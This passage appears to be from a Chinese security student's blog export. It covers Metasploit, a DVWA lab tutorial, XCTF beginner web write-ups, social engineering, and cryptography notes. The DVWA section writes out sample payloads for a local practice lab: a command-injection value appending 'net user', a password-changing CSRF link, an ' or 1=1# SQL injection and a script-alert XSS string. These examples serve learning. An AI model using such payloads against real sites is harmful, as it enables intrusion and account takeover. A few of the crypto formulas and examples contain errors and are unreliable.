系统，edge浏览器。我使用Windows下载了PDF，很可惜我的电脑自带的联想电脑管家，完全没有安全风险提示，于是我手动调用了联想电脑管家去扫描文件，依旧是没有报出风险。根据联想官网的显示使用的是火绒的杀毒引擎，看来查杀能力还是令人担忧啊！查杀率似乎不高。（我要不要换一个杀软？？？？）\n但是怎么可能没有风险呢，所以我选择上网通过腾讯的哈勃文件分析系统进行扫描，结果如下：\n附上哈勃分析系统网址：http://habo.qq.com\n当然你也可以使用attack命令中的命令对主机进行攻击，前提是需要绑定一个靶机。\n再对靶机运行attack中的相应模块进行攻击，与上面演示的大致是一样的。大家可以自行使用Kali来进行metasploit的练习，但是不一定可以找到可以供攻击的攻击漏洞。可以自行尝试一些模块。\n本文只为简单的介绍一下metasploit的使用流程吧。\n参考资料[1]陈铁明.网络空间安全实战基础:第一版.北京:人民邮电出版社,2018.\n","slug":"Metasploit入门上手","date":"2020-03-09T08:02:10.000Z","categories_index":"学习笔记","tags_index":"网络安全","author_index":"A1andNS"},{"id":"fc19ff46ec94019a93ce13e12e1e89c6","title":"DVWA初学","content":"DVWA的介绍DVWA是用PHP和MySQL编写的用于常规web漏洞教学和检测web脆弱性测试程序，它包含SQL注入、XSS、CSRF等常见的一些安全漏洞。我们可以在本机或者靶机甚至服务器搭建DVWA环境，供我们练习渗透技术，也可以查看后端是怎么写的，了解原理。最重要的还是自己搭的平台，合法的进行练习和渗透。这点很重要，最好不要随意攻击他人网站，毕竟现在有网络安全法了。DVWA的官方网站是http:// www.dvwa.co.uk/\nDVWA的安装搭建PHP环境想要运行DVWA必须搭建一个PHP环境，而且在Windows下进行搭建和配置环境时十分复杂的。所以一般使用一个集成化软件PHPStudy，这是一个可以很轻松进行本地环境搭建的软件。不过之前也爆出了有后门的问题，不过据我了解，现在官网上的版本已经被修复过了，大家可以去下载没有后门的版本。附上网址：http://www.phpstudy.net/\n安装步骤这里就不过多描述了，一般就是选择全部安装，如果使用不了，可以看看是不是被安全软件或者防火墙拦截了，或者相关端口被调用。\n\n安装DVWA首先下载DVWA文件\n然后要确保可以进入http://localhost/phpmyadmin或者连接上数据库，如下图：\n\n将DVWA压缩包文件解压到phpstudy的www目录下\n\n然后在地址栏里输入http://localhost/DVWA-1.9/setup.php\n这里的DVWA-1.9是你放在www文件夹里的文件名，是什么就写什么。\n\n点击create/reset database，如果出现”could not connect to the database - please check the config file.”的错误信息。就要打开DVWA/config/config.inc.php文件，进行一些改动\n\n再重新创建数据库即可。\n进入链接http://localhost/DVWA/login.php，其中默认用户名/密码有几个，这里就说一个，其他大家自行去获取吧。admin/password。这是其中一个账号密码。\n配置安全级别在页面的左侧有个“DVWA Security”，可以进入进行安全级别选择，安全级别越高渗透难度就越大，所以一般都从low级别开始，不要随意就impossiable，不太现实。记得设置完要submit不然就又是impossible了。\nDVWA基本使用brute Force（暴力破解）一般是利用burpsuit和字典及逆行你暴力破解，例如轰动全国的2014年12306撞库事件，本质就是，暴力破解攻击。\ncommand injection（命令注入）通过构造恶意结构的参数来破环命令语句结构，从而达到执行恶意代码的目的。PHP命令注入攻击漏洞就是PHP应用里最常见的脚本漏洞之一。Windows和Linux系统都可以用&amp;&amp;来执行多条命令，这就给漏洞利用创造了机会。因为只有&amp;&amp;和；会被过滤，所以&amp;不会被过滤，就可以输入”localhost&amp;net user”利用漏洞。\nCSRF（跨站请求伪造）利用尚未失效的cookie、会话等身份认证信息，诱骗其单击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害人的身份向身份认证信息所对应的服务器发送请求，从而完成非法操作。CSRF和XSS最大的区别就是，CSRF没有盗取cookie而是直接利用。\nCSRF的最基础利用就是直接使用构造链接：http://localhost/dvwa/vulnerabilities/csrf?password_new=password&amp;password_conf=password&amp;Change=Change#\n当受害者单击了这个链接，他的密码就会被改为password。当然这是比较简单的攻击方式，从链接就知道是在改密码。\nFile Inclusion(文件包含)当服务器开启了allow_url_include选项时，就可以通过PHP的某些特性函数利用URL去包含动态包含文件。如果没有对文件的来源进行严格的审查就会导致任意文件或命令被执行。\n文件包含漏洞分为本地文件包含和远程文件包含，远程文件包含漏洞则是因为开启了PHP配置里的allow_url_fopen选项。\nFile Upload（文件上传漏洞）通常是由于上传文件的类型和内容没有进行严格的审查，使得攻击者有机可乘，上传木马来获取服务器的webshell权限。所以这个漏洞会给系统以毁灭性的破坏，有很多的中间件都曾经爆出过文件上传漏洞，例如Apache、Tomcat、Nginx等\n但是文件上传漏洞的重点是你要能够成功上传文件到服务器。其次是你上传的文件必须是可以进行执行的，最后还要知道上传文件的路径。也就是上传木马，得到路径，远程利用。\nInsecure CAPTCHA(不安全的验证流程)CAPTCHA是全自动区分计算机与人类的图灵测试。之所以说是不安全的是因为，在验证过程里存在逻辑漏洞。\n测试时需要先在http://www.google.com/recaptcha上注册recaptcha_public_key和recaptcha_prive_key,将其填入DVWA中config目录下的config.inc.php文件里，就可以看到初始界面。\nSQL Injection(SQL注入)测试是否存在注入点，这里用户交互的地方为表单，这就是常见的SQL注入漏洞存在的地方。正常测试输入1，可以得到正常的查询结果。以后再详细说明SQL。\nSQL injection（盲注）所谓盲注就是再我们输入一些特殊字符时没有回显，影响不大，输入‘or 1=1#依旧可以显示所有的数据。\nXSS（reflected）（反射型XSS）XSS就是跨站脚本攻击，通过向web网页植入恶意的Script代码，当用户浏览网页时就会执行代码，从而恶意攻击用户。\nXSS（stored）（储存型XSS）相比较于放射型XSS漏洞，存储型XSS影响更加持久，如果加入的代码过滤不严，那么这些代码会储存在服务器里，用户访问该页面就会触发代码执行，这种XSS比较危险，容易造成蠕虫、盗取cookie等。\n在name栏输入1，在message栏输入一下代码，可以看到下图\n&lt;script&gt;alert(/xss/)&lt;/script&gt;\n\n参考文献[1]陈铁明.网络空间安全实战基础:第一版.北京:人民邮电出版社,2018\n","slug":"DVWA初学","date":"2020-03-09T08:01:01.000Z","categories_index":"学习笔记","tags_index":"网络安全,WEB","author_index":"A1andNS"},{"id":"e6587bf8c423daf7f73220884b619b0a","title":"XCTF攻防世界Web新手入门题WP","content":"第一题：view_source这一题从题目开始就在进行暗示，view_source意为观看源代码，这就是在明确说要去看网页源代码。\n打开网页就是熟悉的flag不在这里，但是flag应该就在source里，所以使用F12进行源码查看，轻松找到了flag： cyberpeace{cc134ff06c517674b100366d6f6e4466}\n考察点在网页源代码里通过注释的方式隐藏内容\n观察和思考在工作中，确实存在一些程序员为了方便或者提醒自己，会用这种极其不安全的手段来记录某些信息，这将带来严重的安全隐患。在工作生活中编写前端html代码时也要注意在网页发布时，去除开发过程中的注释，以免重要的信息泄露。据我的观察，也会有一些公司故意利用这种特性来进行自我宣传和广告，大多时科技公司，例如百度网页的源代码，近期就是校招的广告。在源代码里做宣传，一般也就是科技公司所为了，除了IT工作者，还有谁会无聊到去看源代码呢。\n第二题：get_post这一题，看到题目就联想到了post类型的请求。打开网页提示我们用get方式传入一个参数a=1，所以直接在url后面添加?a=1即可。之后又提示要我们用post传入一个b=2，所以使用hackbar工具，传入一个post请求类型的b=2，得到我们想要的flag:cyberpeace{2c088170d7c39c5ab26ca88b5af60216}\n考点考察对http请求中的post类型和get类型请求的理解和应用。\n观察与思考HTTP协议里，对于请求类型的定义远不止于GET和POST类型，但是大多数使用的是这二者。例如还有OPTION（请求一些选项的信息）、HEAD（请求读取由URL所标志的信息的首部）、PUT（在指明的URL下储存一个文档）、DELETE（删除指明的URl所标志的资源）、TRACE（用来进行环回测试的请求报文）、CONNECT（用于代理服务器）。但这些请求方式相比本题中的两种风险更大，因为有的涉及到了资源的删除和储存文件。但是GET和POST类型依旧会存在一些风险，这就需要在编写后端代码的时候注意进行过滤，防止黑客而已传入参数。\n第三题：robots这题题目和提示都很明显的指向了robots协议，所以在url的结尾加上robots.txt，打开查看txt。\n\n所以可以得到第一提示，它不允许所有的搜索引擎爬过，不被允许的内容是一个flag_1s_h3re.php的网页文件。\n所以直接去访问这个网页。\n得到了flag： cyberpeace{8a3929d4ffec81ab98efaec47c1fbe66} \n考察点robots协议的相关知识\n观察和思考这题涉及到了robots协议。 robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。 所通过在这个txt文档里添加相关的一些内容来禁止搜索引擎爬取相关的网页和路径。这样搜索引擎就只会爬取未经限制的网页。\n 每当用户试图访问某个不存在的URL时，服务器都会在日志中记录404错误（无法找到文件）。每当搜索蜘蛛来寻找并不存在的robots.txt文件时，服务器也将在日志中记录一条404错误，所以你应该做网站中添加一个robots.txt。 如果你在robots.txt里面设置了禁止所有搜索引擎爬取，那么就会导致你的网页无法被搜索引擎收录。那就再学习一下robots.txt文件的格式\nUser-agent:该项的值用于描述搜索引擎robot的名字，如果是*表示的是所有的搜索引擎\nDisallow:该项的值用于描述不希望被访问到的一个URL，这个URL可以是一条完整的路径，也可以是部分的，任何以Disallow开头的URL均不会被robot访问到。\nAllow:该项的值用于描述希望被访问的一组URL，与Disallow项相似，这个值可以是一条完整的路径，也可以是路径的前缀，以Allow项的值开头的URL是允许robot访问的。\n我们常用的搜索引擎类型有：\ngoogle蜘蛛：googlebot\n百度蜘蛛：baiduspider\nyahoo蜘蛛：slurp\nalexa蜘蛛：ia_archiver\nmsn蜘蛛：msnbot\n有一些题目也会把flag藏在某个隐藏目录下\n第四题：backup根据提示他要我去寻找备份文件，进入网页问我们index.php的备份文件。那么我就再url处输入index.php.bak访问，跳出下载框，我下载文件到本地打开它。\n\n得到flag：Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}\n考察点考察对网页文件的备份名称了解，后缀为.bak\n思考一些网络管理员再一些目录下，放置了网页备份文件，导致备份文件泄露，这是一种极其不安全的行为，应该要注意这个问题。如果重要的信息被泄露，将会让攻击者有机可乘，造成网站损失。\n第五题：cookie看提示就知道适合cookie相关的内容。打开之后问我知不知道cookie，我下意识的去看来一下cookie\n看到了一个提示cookie.php所以我就访问了cookie.php\n根据网页的提示我看了http的请求头\n得到的flag：cyberpeace{048fe3c6960ca5f28d6eebe61ad8c498}\n考察点cookie相关知识，这里是查看网页cookie\n观察与反思 Cookie指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据 。服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。 所以cookie使用被攻击者利用从而导致重要的信息泄露。所以要重视对cookie的保护。\n第六题：disable_button从题目是不可用的按钮，以及描述里提到的前端知识。就知道是要修改前端代码来让按钮可以点按。\n\n果然一个不能按的按钮，查看前端代码\n\n修改代码把disable改为able即可\n点按button得到一个flag\ncyberpeace{0f10ea6ef3068a2eedf94be8d546739a}\n考察点前端代码的理解和修改\n观察和思考对前端的一些修改时可以达到一些绕过前端限制的效果，所以很多时候前端限制的效果不好，反而容易被人破解了，所以应该从后端上来进行限制会比较好。\n","slug":"XCTF攻防世界Web新手入门题WP","date":"2020-03-09T07:59:49.000Z","categories_index":"CTF","tags_index":"网络安全,WEB","author_index":"A1andNS"},{"id":"d721f9019e08a79c9c6096b65c2c4371","title":"社会工程学学习笔记","content":"社会工程学概述社会工程学，又简称为社工。它的大概意思就是欺骗或诈骗他人或引诱他人去为自己进行特定的行动，以达到搜集信息、欺诈、访问计算机系统的目的，而且在很多时候攻击者与受害者并没有面对面的接触。\n社会工程学对一个攻击者而言的重要性不可小觑，同时作为安全人员，也要对社会工程学进行研究，这样才可以识破黑客的伎俩，更好的做好自己的工作，同时普通的网民也很有必要对社会工程学又所了解，从而减少被攻击者欺骗、诈骗的可能。\n社会工程学攻击常见的攻击方式：1、结合实际的环境渗透这种方法需要攻击者结合被攻击者所处的环境，和他的喜好，重视什么下手，又一种给被攻击者画像的感觉，把他的形象慢慢描绘出来从而对其的信息进行综合利用，从了解到攻击的方式。\n2、伪造欺骗被攻击者这个就是我们常说的诈骗，钓鱼攻击。通过伪造邮件和钓鱼网站，来诱骗被攻击者输入账号密码或者下载恶意应用。主要事针对疏于防范的心理进行诱骗，利用了信任和疏忽。\n3、说服被攻击者它要求要攻击者需要与被攻击者，达成某种一致，这种伤害很大。但是我认为难度也是很大的，首先双方需要又共同利益，寻找共同利益并且就此达成一致需要一定的水平，或者就是给好处收买，主要针对一些意志动摇者，要么就是威逼利用，抓住他的把柄来说服他为黑客办事，这个和恐吓也有点像，但是我认为恐吓被攻击者的手段，大多是一次性的为了一次性的获取相关的敏感信息，而通过恐吓威逼来说服他为自己办事，就可能是一个持续性的工程，我认为这应该是二者的区别。即长期与短期的区别。\n4、恐吓被攻击者恐吓式的攻击，就是我认为大多是短期恐吓的攻击方式，他更加追求一次性的通过这个手段获取被攻击者的信息。主要还是伪装成某些机构、政府部门等对被攻击者进行相应的恐吓，利用了人的害怕或者恐惧心理下手。\n5、恭维被攻击者这个就需要黑客的个人能力很强了，需要精通心理学，人际关系学，行为学等知识和技能，善于利用人的本能反应和好奇心，盲目信任、贪婪等人性弱点设置攻击陷阱，投其所好，实施欺骗。\n6、方向社会工程学黑客通过技术或非技术手段给计算机造成故障，使得被攻击者深信问题存在，诱使其泄露关键信息。这种方法很隐蔽，主要还是利用了病急乱投医的心理。\n信息收集1、爬虫\n2、使用搜索引擎语法\n3、Nmap\n4、DNS分析\n5、Nessus\n6、Scapy\n其中搜索引擎语法是个很好的信息收集方式，搜索引擎大家都会简单使用，但是搜索引擎的高级用法很多人就不知道了。Google hack语法就是黑客们很喜欢用的，但是不同的搜索引擎的搜索语法是不同的。爬虫也是很好用的一个工具。至于Nessus，我今天安装在了Windows上但是搞了半天不太会，host扫描的时候局域网内的存活主机一个都没有被扫描出来。还有待研究。\n总结社会工程学真的很重要，利用社会工程学攻击者可以获取大量的信息和数据，造成的危害也是很大的，黑客利用心理学攻击人们，防不胜防。恶意软件和恶意插件更是横行，网络风险很大，我们很有必要掌握一些必要的社会工程学知识才可以了解黑客背后的手法，才可以很好的做好安全防护这件事情。一句话：社会工程学很重要，也很必要，它可以帮助我们提升安全意识，提升自我保护的意识。\n","slug":"社会工程学学习笔记","date":"2020-03-09T07:58:38.000Z","categories_index":"学习笔记","tags_index":"网络安全","author_index":"A1andNS"},{"id":"f0da9c453120872f00a6890b00f56e44","title":"古典密码与现代密码的算法分类结构逻辑图","content":"自己使用百度脑图制作的一个分类图，在这里安利一下，这东西挺好用的，重点是免费，可以用来画思维导图等等，良心啊！！！附上URL：https://naotu.baidu.com/感兴趣的朋友可以去体验一下，效率整理类好工具。下面上图了：\n","slug":"古典密码与现代密码的算法分类结构逻辑图","date":"2020-03-09T07:57:26.000Z","categories_index":"学习笔记","tags_index":"网络安全,Crypto","author_index":"A1andNS"},{"id":"dab54fd2655655c7faa2b5033cd1ff05","title":"密码安全之古典密码、对称密码","content":"阅读前推荐观看我之前做的分类图URL：https://blog.csdn.net/qq_26139045/article/details/103113818\n密码算法密码学可以分为古典密码学和现代密码学。其中现代密码学的出现于一个熟悉的人脱不了关系，他就是香农了，绝对的大佬。\n古典密码于现代密码的区别之处，我认为就是古典密码是依赖于加密算法的精心设计和保密性，而现代密码这是公开了加密所用的算法，注重的是对密钥的保密。两者的侧重点不同，一个在算法的保密上，另一个则是在密钥的保密上。而将现代密码在以密钥细分就会分为，对称加密和非对称加密。所谓的对称加密，就是加密时和解密时的密钥是一样的；而非对称加密则是加密密钥和解密密钥不同，在我看来就目前而言，似乎非对称加密会使用更多，最近经常看到的RSA就是一种非对称加密方法，只可惜还没有搞明白RSA。\n古典密码置换密码所谓置换密码真的就只是置换，把明文通过一些方法排列，然后按你想要的方向或者顺序读出，就成为一个密文。这是一种比较简单的加密方式。正是由于这种方法过于简单，所以它禁不起穷举的，是可以进行爆破的。置换密码可能是先排矩阵再按列读取，也有可能会使用密钥，但是这里的密钥只是为了助记，与现代密码的密钥大不相同。通过密钥去除重复字母后，按字典序编号，然后按编号读出相应的列，实现加密。\n例如：明文：this is transposition cipher\n密钥：password\n数字序列：4167352\n密文：hath ts iiphtripsocin iessor\n注意！！！密文要写的与明文格式相同。\n\n\n\nt\nh\ni\ns\nj\ns\nt\n\n\n\nr\na\nn\ns\np\no\ns\n\n\ni\nt\ni\no\nn\ne\ni\n\n\np\nh\ne\nr\n\n\n\n\n\n替代密码说到替代密码，大家最熟悉的可能就是凯撒密码。替代密码是利用了替代法进行加密的，通过将明文中的字符使用其他的字符替代后形成密文。\n它还有很多类型，比如单表替代密码，多明码替代密码，多字母替代密码，多表替代密码。凯撒加密就是单表替代密码了，所有的字母都是相同的偏移量，所以凯撒是可以被轻易的破解的，直接暴力破解，CTFCracker就可以实现凯撒爆破。而多表替代密码就提高了破解的难度，像维吉尼亚密码、希尔密码，一次一密钥密码、Playfair密码等等，由于使用了多个替换表，情况更加复杂，爆破难度就蹭蹭蹭上去。\n在我看来维吉尼亚其实就是凯撒的加强版，只不过是每个字符都有自己独特的偏移量了，不在如凯撒一样统一偏移量，所以对于破解而言就提高难度了。\n加密：Ci=(Mi+Ki)mod26\n解密就是i一个逆过程，Mi=(Ki-Ci)mod26\n例如密钥可能为：cipher即（3，9，16，8，5，18）\n明文 :this is substitution cipher\n密文：vpxz mj ucqzxzvcipse eqeoii\n对称密码对称密码可以分为分组密码和序列密码。分组密码是以一个固定大小作为每次处理的基本单元，而序列密码则是以一个单位元素（通常是一个字母或一个比特）作为基本的处理单元。当分组长度等于单位长度的是否，分组密码也就是序列密码，所以你可以这样理解，序列密码是分组密码中特殊的一种情况，即分组长=单位长。\n分组密码的常用工作模式：\n1、电子密码本（ECB）最简单的加密模式即电子密码本模式，将加密的消息按照密码块的块大小分为数块，对每一块进行独立加密。\n优点：实现简单、效率高；有利于并行计算；误差不会被传送。\n缺点：不能隐藏明文的模式，相同的明文会产生相同的密文；可能对明文进行主动攻击，比如说黑客可以通过获取账号对应的密文段，进行密文段替换，成功实施ECB重放攻击\n2、密码块链接（CBC）在CBC模式下，每个密文块先要与前一个密文进行异或，然后再加密，所以它高度依赖于上一个密文块，这就对数据完整性要求很高。因为第一个明文没有上一个密文，所以就要引入一个初始化矢量（IV）。\n优点：不易被主动攻击，这也是得益于它的这种像串行的机密模式，安全性高于ECB，适合传输长度较长的报文，是目前SSL和IPSec安全协议的应用标准。\n缺点：不利于并行计算；有误差传输效应；需要维护初始化矢量IV。\n3、密文反馈（CFB）密文反馈模式我觉得和CBC非常相似，区别上我觉得就是，一个先异或，一个后异或，它把上一个密文进行分组密码加密，然后再和明文进行异或。与CBC一样，也需要一开始引入一个初始化矢量。\n优点：隐藏了明文模式；分组密码转化为流模式，增强了安全强度；可以及时加密传送小于分组的数据。\n缺点：不利于并行运算；存在误差传送效应，即一个明文单元受损可以影响多个单元；需要维护一个IV。\n分组密码包括DES、IDEA、SAFER、Blowfish和Skipjack等等，最新国际标准算法是AES，以前使用的是DES/3DES算法。分组密码的一个核心变换——Feistel结构。大多数分组密码的结构本质上都是基于Feistel网格结构，所以这是一个很重要的地方。\nFeistel网络的安全性与一下参数有关。\n（1）分组大小\n（2）密钥大小\n（3）子密钥产生算法：该算法复杂性越高，则密码分析越困难\n（4）轮数n：单轮结构远不足以保证安全，一般轮数选取16\n（5）轮函数F：结构越复杂越难分析\n分组加密算法DESDES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。明文按64bit进行分组，密钥长64bit。\nDES算法具有极高的安全性，到日前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。但是随着计算处理能力的提升，为了克服DES密钥空间小的缺陷，研究人员提出了三重DES的变形方式，即采用了两个密钥共128bit长度，仅加大了穷举密钥的计算复杂度。\n分组加密标准AESAES算法基于排列和置换运算。排列是对数据重新进行安排，置换是将一个数据单元替换为另一个。AES使用几种不同的方法来执行排列和置换运算。AES是一个迭代的、对称的密钥分组的密码，它可以使用128、192、256位密钥，并且通过128bit分组加密或解密数据，既然是对称加密，所以它使用相同的密钥进行加密解密。迭代加密时就要使用一个循环结构，在循环中重复置换和替换输入数据。\n序列密码序列密码是一个随时间变化的加密变换，具有转换速度快、低错误传播的有点，硬件实现电路简单，缺点是有低扩散、插入或修改等不敏感性。目前序列密码研究成果没有完全公开，因为序列密码更多应用于外交和军事部门等机密部门。目前公开的序列密码算法有RC4、SEAL等。 说到序列密码必须说一次一密，如果序列密码所使用的是真正随机方式的、与消息流长度相同的密钥流，那么这个序列密码就是一次一密的密码体制（One-Time Password）。\n至于序列密码加密和解密，加密过程大概就是密钥K通过密钥流生成器生成密钥流，使用密钥流和明文进行异或运算得到密文；解密过程这是使用密钥K通过密钥生成器生成密钥流，在用密钥流和密文进行异或得到明文。\n注：密钥流生成器的核心是一个伪随机数发生器，而密钥K为该随机数发生器的种子。应用最广的随机数发生器为线性反馈一位寄存器（LFSR）。当LFSR周期无限长即可形成OTP一次一密系统，OPT是一种理想的安全流密码体制。\n一次一密系统应用目前面临的挑战：\n1、密钥配送问题，OTP的密钥长度和明文长度相同，若能把密钥安全有效地发生出去，那还加什么密呢？？\n2、密钥的保存问题，OTP把保存明文问题转化为保存于明文等长的密钥问题\n3、密钥的复用：OTP不能使用过去用过的随机比特序列，否则就会泄露之前的通讯内容，这也叫前向安全。\n4、密钥的同步，明文很长的时候，密钥也会一样长，在同步密钥的过程中一旦出现错误，后续通讯就无法解密，有时也被称为后向安全。\n5、密钥的生成问题，OTP需要生成大量的随机数，而我们目前只能使用计算机生成伪随机数来暂时替代，凯撒伪随机数终究不是随机数，无法满足需求，而想要无重现性的真正随机数生成的难度极大。\n流密码的安全性主要依赖于主控密钥K的保密性和密钥流发生器的可靠性。密钥序列产生算法最为关键，其生成的密钥必须具备伪随机性，至于什么是伪随机性，就留给大家自行百度了。序列密码的安全性确实高，加密速度也快，实时性好，就是过于要求同步，要实现严格同步，需要付出很高的代价。\nRC4序列密码RC4由RSA Security的Ron Rivest在1987年设计的一种高速简洁的流密码，被广泛用于常用协议，比如无线网络安全算法、SSL/TLS、HTTPS等安全协议。RC4加密分为两步：\n1、Key-Scheduling Algorithm(KSA）密钥调度算法，采用可变长度的加密密钥产生密钥流生成器的初始状态。\n2、Pseudo-Random Generation Algorithm（PRGA）伪随机子密码生成算法，根据初始状态生成密码流，并于明文进行相异或产生密文。\nRC4采用的是XOR运算，一旦子密码序列出现了重复，密文就有可能被破解。存在部分弱密钥，是子密序列在不到100B内就出现重复。那么就可能在10万字节内就发生完全重复风险。所以在使用RC4算法时候，必须对加密密钥进行安全测试，避免出现弱密钥问题。\n","slug":"密码安全之古典密码、对称密码","date":"2020-03-09T07:56:23.000Z","categories_index":"学习笔记","tags_index":"网络安全,Crypto","author_index":"A1andNS"},{"id":"e2abbcc65a824b1fa9ae0ab1c5718bf6","title":"密码安全之公钥密码、散列算法、数字签名","content":"密码安全之公钥密码、散列算法、数字签名上期文章密码安全之古典密码、对称密码链接：https://blog.csdn.net/qq_26139045/article/details/103153172密码开篇文章古典密码与现代密码的算法分类结构逻辑图：https://blog.csdn.net/qq_26139045/article/details/103113818\n公钥密码对称密码常用于通信会话中的加密，但随着对称加密应用越来越广，会话密钥的管理问题也随之面临挑战。在由n个实体的网络里，需要的会话密钥数量为n(n-1)，即达到O(n^2)。而且分组加密主要依赖于多轮复合的扩散和混淆运算，安全强度有待提升。\n公钥密码也就是非对称密码，即加密密钥和解密密钥是不同的。一个可以被公开的密钥被称为公钥，一个私人专用保管的密钥叫私钥。公钥加密的信息只能用对应私钥来解密。公钥相比对称密码里的相同密钥就突出优点了，它可以使用一个公钥而不需要联机密钥服务器，密钥分配变得简单，不需要为了每一个设不同密钥。一个公钥就可以完成加密，只要私钥是保密，就都可以使用对应私钥解密。这样就降低了密钥的管理复杂度，提高了密码学的可用性。\nDiffie-Hellman密钥交换算法此密钥是以Diffie和Hellman命名，下面Alice和ben的DH密钥交换原理。\n（1）选定一个可公开的大质数p和底数g。\n（2）Alice和ben分别选定一个私有素数a和b。\nDH密钥协商的目的是让Alice和Ben安全的获得共享密钥，任何第三方实体即使截获双方通讯数据，也无法计算得到相同的密钥。Alice和Ben的协商会话密钥K的过程为：\n1、Alice和Bob协定使用p=23，g=5\n2、Alice选择一个秘密整数a=6，计算A=g^a mod p并且发送给Bob：A=5^6 mod 23 = 8\n3、Bob选择一个 秘密整数b=15，计算B=g^b mod p并发送给Alice：B = 5^15 mod 23 = 19\n4、Alice计算K = B^a mod p,即19^6 mod 23 = 2\n5、Bob计算K = A^b mod p ,即8^15 mod 23 =2\nDH是一个公钥算法，应用的数论难题是大数的离散对数求解难题，已知g、a，计算A=g^a是容易的，但反之，已知A和g，求解a是困难的。所以攻击者就算截获了A和B，也无法计算得到a和b，更不可能算出K。\nRSA公钥算法RSA大家可能都经常听说，在很多CTF题目里Crypto里基本都会出现RSA。公开密钥算法是1976年由当时在美国斯坦福大学的Diffie和Hellman两人首先发明，但是目前流行的RSA算法则是MIT教授Ronald L.Rivest、Adi Shamir和Leonard M.Adleman共同发明的。RSA也是来自于这3位数学家的名字首字母。RSA算法就是依赖于大数因子分解难题，即给定两个大素数p、q，计算它们的乘积n=pq是容易的，但反之，给定n，求解p和q是一个经典的数论难题。\n（1）密钥生成\n1、选择两个大素数：p和q。\n2、计算欧拉函数：ф(n) = (p-1)(q-1)\n3、选择一个正整数e，是gcd(e,modф(n)),即e和ф(n)互为素数。\n4、根据de=1（modф(n)),利用Euclid算法计算出d。\n5、公钥即为K=&lt;e,n&gt;。\n6、私钥即为S=&lt;d,p,q&gt;\n注： Euclid算法即欧几里德算法又称辗转相除法，是指用于计算两个正整数a，b的最大公约数。应用领域有数学和计算机两个方面。计算公式gcd(a,b) = gcd(b,a mod b)。 \n（2）公钥加密\n1、记明文信息为m（二进制），将m分成等长数据块m1、m2…，m3，块长s，其中2^s&lt;=n\n2、加密：Ci=mi^e(mod n)\n3、解密：mi=ci^d(mod n)\n一开始RSA选用的n长度达到512位，但是随着算力的提升，如今的RSA公钥长度已经达到了4096bit\n公钥密码相比对称密码，有实现难度大，安全强度大、计算耗费大的特点，所以一般日常使用都是RSA和AES算法混合使用，通常称为数字信封技术。就是因为安全强度大，计算耗费大，所以加密所有明文信息显然是不太现实和划算。因此使用AES分组加密密文信息，使用RSA加密AES密钥，这样既可以保证AES密钥安全，之前有说到对称加密的密钥保护是很重要的，又可以提高加密效率，比较符合使用需求。接收方可以收到RSA加密的AES密钥和AES密文，只有持有RSA私钥的合法接收方才可以解开加密的AES密钥，从而使用AES密钥解密密文，得到明文。\n散列算法密码学上的散列算法是一种测试和保障信息完整性的有效方法，散列函数可以接受任意长度的明文信息输入，输出的是一个固定长度的字符串，这个字符串就叫作散列值或信息摘要。\n散列算法是独立于对称密码和公钥密码体制的，因为它不需要解密，只是一种保障信息完整性的鉴别算法。A给B发送信息，为了保障B收到的是完整的信息，所以A会把信息的摘要也随信息一起发给B，B受到后就可以使用相同的方法再次计算出这段信息的摘要，然后将新的摘要和A发来的摘要进行比对，如果相同说明消息完整，如果不同，那么B就知道这些数据可能在传输过程中被黑客篡改，但是黑客可能也会一起修改散列值，所以依旧有可能欺骗用户，所以还有其他的技术结合使用，后面会说到。\n故而散列算法就需要在密码学满足一些特性：\n1、输入长度不受限制，可以是任何长度，可以对任意明文计算散列值。\n2、输入时固定 长度，如MD5是128bit长度，SHA则是256bit\n3、给出任意的报文可以很轻松地计算出散列函数H(x)\n4、散列函数是个不可逆的函数，即给定一个Y，其中，Y=H(x)，无法推算出x\n5、散列函数不存在碰撞，即不存在一个不同于x的x‘使得H(h)=H(x’)\n6、散列函数存在雪崩效应，即明文即使只有细微的区别，其散列值结果也会明显不同。\n例如使用MD5来对两个明文进行处理：\nMD5(“Fujian Agriculture And Forestry University”)=ad568059a39a19391f0b4ec188d54f97\nMD5(“Fujian Agriculture Ans Forestry University”)=9c016f80fe5fb45cada72b7746534609\nMD5的全称是Message-Digest Algorithm 5，即信息-摘要算法。经由MD2、MD3、MD4发展而来。但是我国国内的学者王小云教授在2005年首次找到了MD5散列的碰撞，因此最新的业界标准算法转到了安全散列算法SHA-1和SHA256。\n注：王小云女士，是密码学家，中国科学院院士，清华大学高等研究院杨振宁讲座教授，清华大学密码理论与技术研究中心主任   ，山东大学密码技术与信息安全教育部重点实验室主任。\n散列算法的典型应用是对一段信息产生信息摘要，以防止被篡改。例如Unix系统下有很多的软件在下载时都会有一个与文件名相同，文件拓展名位.md5的文件，这个文件里通常只有一行文本，大概结构如下。\nMD5(zjut.tar.gz)=0ca175b9c0f726a831d895e269332461\n这个就是zjut.tar.gz文件的数字指纹。MD5将整个文件当作一个大文本信息，通过其不可逆的字符串变换算法，产生了这个唯一的MD5信息摘要。我们平时在下载东西时也可以在某些下载站点看到软件的MD5值，它的作用在于可以在下载该软件后，对下载回来的文件用专门的软件（Windows MD5 